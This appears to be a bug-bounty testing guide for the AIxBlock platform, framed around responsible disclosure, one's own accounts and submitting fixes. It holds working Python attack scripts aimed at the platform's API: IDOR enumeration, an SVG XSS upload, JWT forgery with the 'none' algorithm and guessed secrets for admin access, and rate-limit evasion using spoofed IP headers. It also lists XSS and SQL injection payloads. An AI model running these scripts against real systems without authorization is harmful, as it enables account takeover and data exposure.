# Step-by-Step Security Testing Guide

## 🚀 Phase 1: Account Setup & Initial Reconnaissance

### Step 1: Create Test Accounts
```bash
# Visit https://app.aixblock.io
# Create 2 test accounts:
# - Primary testing account (your main account)
# - Secondary account (for IDOR testing)
# Document account details securely
```

### Step 2: Platform Exploration
```bash
# Login and explore all features:
# 1. Profile management
# 2. Organization settings
# 3. Workflow creation
# 4. File upload functionality
# 5. API interactions (check browser dev tools)
```

### Step 3: Traffic Interception Setup
```bash
# Configure Burp Suite:
# 1. Set browser proxy to 127.0.0.1:8080
# 2. Install Burp certificate
# 3. Enable intercept
# 4. Browse the application to capture requests
```

## 🎯 Phase 2: High-Priority Vulnerability Testing

### Test 1: IDOR (Insecure Direct Object Reference)
**Target**: API endpoints with user/organization IDs
**Previous Success**: $450 reward for organization IDOR

```python
# Test Script: idor_test.py
import requests

def test_idor_vulnerability():
    # Your session cookies after login
    cookies = {'sessionid': 'YOUR_SESSION_ID'}
    
    # Test organization access with different IDs
    org_ids = [1, 2, 3, 100, 999, 1000]
    
    for org_id in org_ids:
        url = f"https://api.aixblock.io/organizations/{org_id}"
        response = requests.get(url, cookies=cookies)
        
        if response.status_code == 200:
            print(f"POTENTIAL IDOR: Can access org {org_id}")
            print(f"Response: {response.text[:200]}...")
        
    # Test user profile access
    user_ids = [1, 2, 3, 100, 999, 1000]
    
    for user_id in user_ids:
        url = f"https://api.aixblock.io/users/{user_id}"
        response = requests.get(url, cookies=cookies)
        
        if response.status_code == 200:
            print(f"POTENTIAL IDOR: Can access user {user_id}")

# Run the test
test_idor_vulnerability()
```

### Test 2: File Upload XSS
**Target**: File upload functionality
**Previous Success**: $200 reward for SVG XSS

```python
# Test Script: file_upload_xss.py
import requests

def test_svg_xss():
    # Malicious SVG payload
    svg_payload = '''<?xml version="1.0" standalone="no"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
    "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
       <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
       <script type="text/javascript">
          alert('XSS_VULNERABILITY_FOUND');
       </script>
    </svg>'''
    
    # Upload to different endpoints
    upload_endpoints = [
        'https://app.aixblock.io/upload',
        'https://api.aixblock.io/files/upload',
        'https://workflow.aixblock.io/upload'
    ]
    
    cookies = {'sessionid': 'YOUR_SESSION_ID'}
    
    for endpoint in upload_endpoints:
        files = {'file': ('test_xss.svg', svg_payload, 'image/svg+xml')}
        response = requests.post(endpoint, files=files, cookies=cookies)
        
        print(f"Upload to {endpoint}: Status {response.status_code}")
        if 'uploaded' in response.text.lower():
            print("FILE UPLOADED - Check if XSS executes when accessed")

test_svg_xss()
```

### Test 3: Authentication Bypass
**Target**: Login and session management
**Previous Success**: $450 reward for auth bypass

```python
# Test Script: auth_bypass.py
import requests
import jwt

def test_jwt_manipulation():
    # After login, capture your JWT token from browser storage or cookies
    token = "YOUR_JWT_TOKEN_HERE"
    
    try:
        # Decode without verification
        decoded = jwt.decode(token, options={"verify_signature": False})
        print(f"Original token claims: {decoded}")
        
        # Test privilege escalation
        escalated_claims = decoded.copy()
        escalated_claims['role'] = 'admin'
        escalated_claims['is_superuser'] = True
        escalated_claims['permissions'] = ['*']
        
        # Try different signing algorithms
        algorithms = ['none', 'HS256', 'HS512']
        
        for alg in algorithms:
            try:
                if alg == 'none':
                    manipulated_token = jwt.encode(escalated_claims, '', algorithm=alg)
                else:
                    # Try common secrets
                    secrets = ['secret', 'key', 'aixblock', '']
                    for secret in secrets:
                        manipulated_token = jwt.encode(escalated_claims, secret, algorithm=alg)
                        
                        # Test the manipulated token
                        headers = {'Authorization': f'Bearer {manipulated_token}'}
                        response = requests.get('https://api.aixblock.io/admin/users', headers=headers)
                        
                        if response.status_code == 200:
                            print(f"PRIVILEGE ESCALATION FOUND with {alg} and secret '{secret}'")
                            
            except Exception as e:
                continue
                
    except Exception as e:
        print(f"JWT decode error: {e}")

test_jwt_manipulation()
```

### Test 4: Rate Limiting Bypass
**Target**: API endpoints
**Previous Success**: Token reward for rate limit bypass

```python
# Test Script: rate_limit_bypass.py
import requests
import threading
import time

def test_rate_limiting():
    login_endpoint = "https://api.aixblock.io/auth/login"
    
    # Test concurrent requests (race condition)
    def make_request(thread_id):
        data = {'username': 'invalid', 'password': 'invalid'}
        response = requests.post(login_endpoint, json=data)
        print(f"Thread {thread_id}: Status {response.status_code}")
        return response.status_code
    
    # Launch 50 concurrent requests
    threads = []
    for i in range(50):
        thread = threading.Thread(target=make_request, args=(i,))
        threads.append(thread)
        thread.start()
    
    # Wait for all threads
    for thread in threads:
        thread.join()
    
    # Test IP rotation bypass
    headers_list = [
        {'X-Forwarded-For': '1.1.1.1'},
        {'X-Real-IP': '2.2.2.2'},
        {'X-Originating-IP': '3.3.3.3'},
        {'X-Remote-IP': '4.4.4.4'},
        {'Client-IP': '5.5.5.5'}
    ]
    
    for headers in headers_list:
        for i in range(10):  # 10 requests per IP
            response = requests.post(login_endpoint, 
                                   json={'username': 'test', 'password': 'test'}, 
                                   headers=headers)
            if response.status_code != 429:  # Not rate limited
                print(f"Rate limit bypass with headers: {headers}")

test_rate_limiting()
```

## 🔍 Phase 3: Manual Testing Checklist

### Web Application Testing:
- [ ] **XSS Testing**: Try `<script>alert('xss')</script>` in all input fields
- [ ] **SQL Injection**: Test `' OR '1'='1` in login forms
- [ ] **CSRF**: Check if state-changing requests require CSRF tokens
- [ ] **Session Management**: Test session fixation and hijacking
- [ ] **File Upload**: Test malicious file uploads (SVG, PHP, etc.)

### API Testing:
- [ ] **Endpoint Enumeration**: Use Burp Suite to map all API calls
- [ ] **Parameter Tampering**: Modify request parameters
- [ ] **HTTP Method Testing**: Try PUT/DELETE on GET endpoints
- [ ] **Content-Type Bypass**: Change Content-Type headers

### Business Logic Testing:
- [ ] **Workflow Permissions**: Can users access others' workflows?
- [ ] **Payment Logic**: Any bypass in payment processing?
- [ ] **Organization Access**: Can users access other organizations?
- [ ] **Admin Functions**: Any admin endpoints accessible?

## 📝 Phase 4: When You Find a Vulnerability

### Step 1: Document Everything
```markdown
# Create file: vulnerabilities/[vulnerability-name].md

## Vulnerability: [Name]
**Severity**: Critical/High/Medium/Low
**CVSS Score**: X.X
**Affected Endpoint**: https://...

## Description
[Technical description]

## Reproduction Steps
1. Login to https://app.aixblock.io
2. Navigate to [specific page]
3. [Detailed steps]

## Proof of Concept
[Screenshots, code, or video]

## Impact
[What an attacker could do]

## Proposed Fix
[How to fix it]
```

### Step 2: Create GitHub Issue
1. Go to: https://github.com/AIxBlock-2023/awesome-ai-dev-platform-opensource/issues
2. Click "New Issue"
3. Use bug report template
4. Include all documentation

### Step 3: Develop Fix
1. Create branch: `git checkout -b bugfix/issue-[number]`
2. Implement security fix
3. Test the fix
4. Submit Pull Request

## ⚠️ Important Notes

### Before You Start:
- **Use only your own accounts** for testing
- **Don't disrupt service** - avoid DoS attacks
- **Document everything** - screenshots, requests, responses
- **Be respectful** - professional communication only

### Legal Compliance:
- Only test with accounts you own
- Follow responsible disclosure
- No social engineering or physical attacks
- Respect the platform and other users

---

**Execute these tests systematically and document your findings. When you discover vulnerabilities, follow the reporting process to submit them properly.**